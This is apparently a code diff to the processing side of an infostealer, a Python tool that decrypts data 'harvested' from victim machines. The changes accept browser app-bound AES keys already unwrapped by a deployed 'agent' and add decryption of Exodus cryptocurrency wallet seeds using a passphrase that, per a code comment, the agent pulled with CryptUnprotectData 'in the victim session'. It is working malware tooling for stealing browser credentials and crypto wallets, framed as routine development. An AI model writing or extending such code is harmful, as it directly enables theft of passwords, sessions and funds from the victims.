@@ -522,9 +522,16 @@ def dump_browser(harvest, out, browser, keyring, system_keys, show):
     browser_keys = []
     if keys_file.is_file():
         for line in keys_file.read_text("utf-8", "replace").splitlines():
-            if line.startswith("app_bound="):
+            # New agents unwrap the app-bound key live, so the AES key is
+            # already here and SECURITY.hiv is not needed.
+            if line.startswith("v20="):
                 try:
-                    browser_keys = unwrap_app_bound(line[10:].strip(), system_keys, keyring)
+                    browser_keys.append(bytes.fromhex(line[4:].strip().replace(":", "")))
+                except ValueError:
+                    pass
+            elif line.startswith("app_bound="):
+                try:
+                    browser_keys.extend(unwrap_app_bound(line[10:].strip(), system_keys, keyring))
                 except Exception as exc:
                     skipped(f"{label}: app-bound key failed", str(exc))
     try:
@@ -749,7 +756,20 @@ def dump_exodus(harvest, out, keyring, system_keys, show):
         skipped("exodus: no seed.seco")
         return
     secret = None
-    if passphrase_json.is_file():
+    live = harvest.root / "wallets" / "exodus-passphrase.txt"
+    if live.is_file():
+        # The agent already called CryptUnprotectData in the victim session.
+        for line in live.read_text("utf-8", "replace").splitlines():
+            if not line.startswith("passphrase="):
+                continue
+            try:
+                candidate = base64.b64decode(line[11:].strip())
+                open_seco(read_seco(seed), candidate)
+                secret = candidate
+                break
+            except Exception:
+                continue
+    if secret is None and passphrase_json.is_file():
         meta = json.loads(passphrase_json.read_text("utf-8", "replace"))
         raw = meta.get("passphrase", "")
         if meta.get("system") and system_keys:
